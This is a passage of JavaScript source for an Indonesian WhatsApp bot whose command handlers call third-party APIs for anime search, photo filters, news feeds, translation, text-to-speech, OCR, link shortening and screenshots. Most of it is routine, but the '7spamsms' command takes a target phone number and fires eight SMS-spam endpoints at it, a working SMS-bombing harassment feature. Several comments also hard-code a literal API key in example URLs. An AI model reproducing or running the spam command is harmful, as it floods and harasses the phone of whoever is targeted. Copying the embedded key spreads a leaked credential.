	    outputFile = await './src/hremo-'+getRandom('.png')
	    replay(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    XeonBotInc.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
//[ANIME MANGA MENU]\\ With apikey lol human
case '7animes': case '7animesearch': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} naruto`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${global.apilol}&query=${text}`)
	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Anime Search 〕*

*⭔ Title :*
  Romaji : *${anu.result.title.romaji}*
  English : *${anu.result.title.english}*
  Native : *${anu.result.title.native}*
*⭔ Format :* ${anu.result.format}
*⭔ Episodes :* ${anu.result.episodes}
*⭔ Duration :* ${anu.result.duration}
*⭔ Status :* ${anu.result.status}
*⭔ Season :* ${anu.result.season}
*⭔ Season Year :* ${anu.result.seasonYear}
*⭔ Start Date :* ${anu.result.startDate.year} ${anu.result.startDate.month} ${anu.result.startDate.day}
*⭔ End Date :* ${anu.result.endDate.year} ${anu.result.endDate.month} ${anu.result.endDate.day}
*⭔ Source :* ${anu.result.source}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '7mangas': case '7mangasearch': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} gotoubun no hanayome`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${global.apilol}&query=${text}`)
	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Manga Search 〕*

*⭔ Title :*
  Romaji : *${anu.result.title.romaji}*
  English : *${anu.result.title.english}*
  Native : *${anu.result.title.native}*
*⭔ Format :* ${anu.result.format}
*⭔ Chapters :* ${anu.result.chapters}
*⭔ Volumes :* ${anu.result.volumes}
*⭔ Status :* ${anu.result.status}
*⭔ Source :* ${anu.result.source}
*⭔ Start Date :* ${anu.result.startDate.year} ${anu.result.startDate.month} ${anu.result.startDate.day}
*⭔ End Date :* ${anu.result.endDate.year} ${anu.result.endDate.month} ${anu.result.endDate.day}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '7character': case '7karakteranime': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} miku nakano`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${global.apilol}&query=${text}`)
	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.image.large }, caption: `*〔 Character Search 〕*

*⭔ Nama :*
  Full : *${anu.result.name.full}*
  Native : *${anu.result.name.native}*
*⭔ Favourites :* ${anu.result.favourites}
*⭔ Description :* ${anu.result.description}` }, { quoted: m })      
}
break
case '7animestory': case '7storyanime': {                  
                let anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${global.apilol}`)               
              media = await getBuffer(anu.result)
  let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    video: media,
                    caption: `*〔 Random Story Anime 〕*`,
                    footer: 'Klik Tombol di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
               XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
          break
          case '7neonime': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/neonimelatest?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]
          //points.sort(function(a, b){return a - b});
  let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.thumbnail },
                    caption: `*〔 Neonime Latest 〕*

*⭔ Title :* ${result.title}
*⭔ Episode :* ${result.episode}
*⭔ Date :* ${result.date}
*⭔ Link :* ${result.link}
*⭔ Deskripsi :* ${result.desc}`,
                    footer: 'Klik Tombol NEXT untuk hasil lainya',
                    buttons: buttons,
                    headerType: 5
                }
               XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
break
case '7kusonimesearch': case '7kusonimes': {
	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} boruto`
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch2?apikey=${global.apilol}&query=${text}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]
  let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: `➡️'NEXT➡️` }, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.thumbnail },
                    caption: `*〔 Kusonime Search 〕*

*⭔ Title :* ${result.title}
*⭔ Link :* ${result.link}`,
                    footer: 'Klik Tombol NEXT untuk hasil lainya',
                    buttons: buttons,
                    headerType: 5
                }
               XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })       
            }
break
//PHOTO EDITOR MENU]\\ With apikey lol human
case '7wasted': case '7pencil': case '7triggered': case '7fisheye': case '7skullmask': case '7cartoon': case '7invert': case '7pixelate': case '7flip': case '7grayscale': case '7roundimage': {
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	
                    //https://api.lolhuman.xyz/api/editor/wasted?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/editor/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break
case '7affect': case '7beautiful': case '7facepalm': case '7hitler': case '7jail': case '7jokeoverhead': case '7rainbow': case '7sepia': case '7trash': case '7wanted': {
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	
                  //  https://api.lolhuman.xyz/api/creator1/affect?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/creator1/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break
case '71977': case '7aden': case '7brannan': case '7brooklyn': case '7gingham': case '7hudson': case '7inkwell': case '7earlybird': case '7kelvin': case '7larlk': case '7lofi': case '7maven': case '7mayfair': case '7moon': case '7perpetua': case '7nashville': case '7reyes': case '7rise': case '7slumber': case '7stinson': case '7toaster': case '7valencia': case '7walden': case '7willow': case '7gingham': case '7xpro2': {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
                  //  https://api.lolhuman.xyz/api/filter/1977?apikey=fleyvin_soft&img=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/filter/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                    }
break

//[News berita MENU]\\ With apikey lol human
case '7hoax': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.link}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.thumbnail)
                      let txt = `*〔 NEWS From turnbackhoax.id 〕*

*⭔ Title :* ${result.title}
*⭔ Publish :* ${result.posted}
*⭔ Deskripsi :* ${result.desc}`

                      XeonBotInc.send5ButImg(m.chat, txt, `Klik NEXT untuk hasil lainnya`, fatihgans, btn)
            }
break
case '7kumparan': case '7republika': case '7liputan6': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From ${command} 〕*

*⭔ Title :* ${result.title}
*⭔ Deskripsi :* ${result.desc}
*⭔ Kategori :* ${result.category}
*⭔ Publish :* ${result.publish}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7newsinfo': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.urlToImage)
                      let txt = `*〔 NEWS From ${result.source.name} 〕*

*⭔ Title :* ${result.title}
*⭔ Deskripsi :* ${result.description}
*⭔ Publish :* ${result.publishedAt}
*⭔ Konten :* ${result.content}`
                      XeonBotInc.send5ButImg(m.chat, txt, `By ${result.author}`, fatihgans, btn)
            }
break
case '7detiknews': {
          let anu = await fetchJson(`https://api.lolhuman.xyz/api/detik?apikey=${global.apilol}`)  
          let ini = anu.result
          let result = ini[Math.floor(Math.random() * ini.length)]   
  let btn = [{
                                urlButton: {
                                    displayText: 'LINK BERITA',
                                    url: `${result.link}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: `➡️'NEXT➡️`,
                                    id: `${prefix + command}`
                                }
                            }]
                      fatihgans = await getBuffer(result.thumbnail)
                      let txt = `*〔 NEWS From detik.com 〕*

*⭔ Title :* ${result.title}
*⭔ Publish :* ${result.time}`
                      XeonBotInc.send5ButImg(m.chat, txt, `${global.fake}`, fatihgans, btn)
            }
break
case '7jalantikus': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From jalantikus.com 〕*

*⭔ Title :* ${result.title}
*⭔ Kategori :* ${result.category}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnindonesia': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnnasional': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnninternasional': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnekonomi': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/ekonomi?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnolahraga': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/olahraga?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnteknologi': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/teknologi?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnhiburan': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/hiburan?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7cnnsocial': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/social?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break


//Tools internet menu  ]\\ With apikey lol human
//https://api.lolhuman.xyz/api/translate/auto/ps?apikey=fleyvin_soft&text=Good%20morning
case '7texttospeak': case '7tekstospeak': case '7tts': case '7gtts': {
	if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih mau di ubah ke bahasa mana\n`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Ubah Teks Menjadi Suara-Multi Bahasa",
								"rows": [
									{
										"title": "Ke Indonesia",
										"description": `Teks ke Suara bahasa Indonesia\n\n${text}`,
										"rowId": `${prefix}tts2 id+${text}`
									},
									{
										"title": "Ke Inggris",
										"description": `Teks ke Suara bahasa Inggris\n\n${text}`,
										"rowId": `${prefix}tts2 en+${text}`
									},
									{
										"title": "Ke Jerman",
										"description": `Teks ke Suara bahasa Jerman\n\n${text}`,
										"rowId": `${prefix}tts2 de+${text}`
									},
									{
										"title": "Ke Perancis",
										"description": `Teks ke Suara bahasa Perancis\n\n${text}`,
										"rowId": `${prefix}tts2 fr+${text}`
									},
										{
											"title": "Ke Spanyol",
										"description": `Teks ke Suara bahasa Spanyol\n\n${text}`,
										"rowId": `${prefix}tts2 es+${text}`
										},
										{
											"title": "Ke Italy",
										"description": `Teks ke Suara bahasa Italia\n\n${text}`,
										"rowId": `${prefix}tts2 it+${text}`
										},
										{
											"title": "Ke Turki",
										"description": `Teks ke Suara bahasa Turki\n\n${text}`,
										"rowId": `${prefix}tts2 tr+${text}`
										},
										{
											"title": "Ke Polandia",
										"description": `Teks ke Suara bahasa Polandia\n\n${text}`,
										"rowId": `${prefix}tts2 pl+${text}`
										},
										{
											"title": "Ke Brunei",
										"description": `Teks ke Suara bahasa Brunei\n\n${text}`,
										"rowId": `${prefix}tts2 bn+${text}`
										},
										{
										"title": "Ke Rusia",
										"description": `Teks ke Suara  bahasa Rusia\n\n${text}`,
										"rowId": `${prefix}tts2 ru+${text}`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case '7tts2': {
	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+Dasar anak tiktok suka pargoy di tempat umum`
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
              let anu = await getBuffer(`https://api.lolhuman.xyz/api/gtts/${tas}?apikey=${global.apilol}&text=${wah}`)
// XeonBotInc.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mp4' },{ptt: false}, { quoted : m })
   XeonBotInc.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mp4', ptt: true, quoted : m })
}
              break
              case '7tst': case '7translate': {
	if (!m.quoted && !text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
//if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih mau di translate ke bahasa mana\n`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Translate Multi Bahasa",
								"rows": [
									{
										"title": "Ke Inggris",
										"description": `Translate ke bahasa Inggris\n\n${text}`,
										"rowId": `${prefix}tst2 en+${text}`
									},
									{
										"title": "Ke Indonesia",
										"description": `Translate ke bahasa Indonesia\n\n${text}`,
										"rowId": `${prefix}tst2 id+${tex}`
									},
									{
										"title": "Ke Jerman",
										"description": `Translate ke bahasa Jerman\n\n${text}`,
										"rowId": `${prefix}tst2 de+${text}`
									},
										{
											"title": "Ke Spanyol",
										"description": `Translate ke bahasa Spanyol\n\n${text}`,
										"rowId": `${prefix}tst2 es+${text}`
										},
										{
											"title": "Ke Italy",
										"description": `Translate ke bahasa Italia\n\n${text}`,
										"rowId": `${prefix}tst2 it+${text}`
										},
										{
											"title": "Ke Palestina",
										"description": `Translate ke bahasa Palestina\n\n${text}`,
										"rowId": `${prefix}tst2 ps+${text}`
										},
										{
										"title": "Ke Rusia",
										"description": `Translate ke bahasa Rusia\n\n${text}`,
										"rowId": `${prefix}tst2 ru+${text}`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
case '7tst2': {
	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+good morning`
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${tas}?apikey=${global.apilol}&text=${wah}`)
m.reply(`*〔 Translate From: ${anu.result.from},To: ${anu.result.to} 〕*

*🌹Translate:* ${anu.result.translated}

*🌹Pengucapan:* ${anu.result.pronunciation}`)
}
break
case '7ocr': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(api('zenz',`/ocr?apikey=${global.apilol}&img=${anu}`))
	replay(`${ini.result}`)
	}
	break
case '7shortlink': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Short Link 2️⃣'}, type: 1},                  
                     {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Shory Link 3️⃣'}, type: 1},                
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7shortlink2': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink2?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},                    
                     {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Shory Link 3️⃣'}, type: 1},                    
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7shortlink3': {
if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink3?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},                  
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Shory Link 2️⃣'}, type: 1},                   
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '7shortlink4': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink4?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},               
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Short Link 2️⃣'}, type: 1},                  
                      {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Short Link3️⃣'}, type: 1} 
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '7ssweb': case '7ssweb1': {
                if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://youtube.com/c/xZrinva`                 
              m.reply(mess.wait)
               let buttons = [
                    {buttonId: `${prefix}ssweb2 ${text}`, buttonText: {displayText: 'SS WEB 2️⃣'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: api('zenz', `/ssweb?apikey=${global.apilol}&url=${text}`) },
                    caption: `*〔 Screenshot WEB From: ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
break
case '7sswebfull': case '7ssweb2': {
                if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://indonesia.go.id`                 
                m.reply(mess.wait)
               let buttons = [
                    {buttonId: `${prefix}ssweb1 ${text}`, buttonText: {displayText: 'SS WEB 1️⃣'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: api('zenz', `/sswebfull?apikey=${global.apilol}&url=${text}`) },
                    caption: `*〔 Screenshot WEB Full From: ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
break
            case '7resum': case '7reroomer': {
            	if (!text) throw `*Masukan teks untuk di resum !*\n_Contoh :_ ${prefix + command} Sebuah kaca yang dipasang di tembok belakang kelasnya tiba-tiba bergerak sendiri.\nDream - Menyanyi memang menjadi hal yang menyenangkan saat sedang kesepian. Begitu pula yang dilakukan oleh gadis berhijab dalam video berikut ini.\nGadis ini datang lebih awal ke sekolah dari murid lainnya. Melihat kondisi kelas yang masih sepi, gadis tersebut lantas menyalakan kamera dan merekam aksinya yang tengah bernyanyi.\nIde Seru Buat Lebaran! Tiktoker Bagi-Bagi Uang THR Sesuai Filter TikTok, Si Nenek Ketiban Rezeki Nomplok\n\nDengan suara merdunya, sang gadis menyanyikan lagu Agnes Monica berjudul Karena Ku Sanggup. Hingga akhirnya sebuah insiden mengejutkan terjadi. Terang saja gadis yang berada dalam video itu terkejut.\nMeski demikian, belum bisa dipastikan apakah kaca itu benar-benar bergerak sendiri atau video ini hanya rekayasa belaka. `                 
         m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/resoomer?apikey=${global.apilol}&text=${text}`)
 replay(anu.result)
 }
 break
case '7spamsms': case '7smsspam': {
            	if (!text) throw `*Masukan nomor target !*\n_Contoh :_ ${prefix + command} 6283110011351`                 
         m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${global.apilol}&nomor=${text}`)
  let ana = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${global.apilol}&nomor=${text}`)
let ane = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${global.apilol}&nomor=${text}`)
let anp = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${global.apilol}&nomor=${text}`)
let anyu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${global.apilol}&nomor=${text}`)
let anfu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${global.apilol}&nomor=${text}`)
let anlu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${global.apilol}&nomor=${text}`)
let aynu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${global.apilol}&nomor=${text}`)
 reply(`Sukses spam sms ke nomor ${text}`)
 }
 break
case '7qrcode': case '7toqrcode': {
	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} Aku suka sama kamu`         
m.reply(mess.wait)        
	XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/qrcode?apikey=${global.apilol}&text=${text}`) }, caption: `*QR Code From Teks : ${text}*` }, { quoted: m })      
	}
break
case '7readqr': case '7readqrcode': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(`https://api.lolhuman.xyz/api/read-qr?apikey=${global.apilol}&img=${anu}`)
replay(ini.result)
                  }
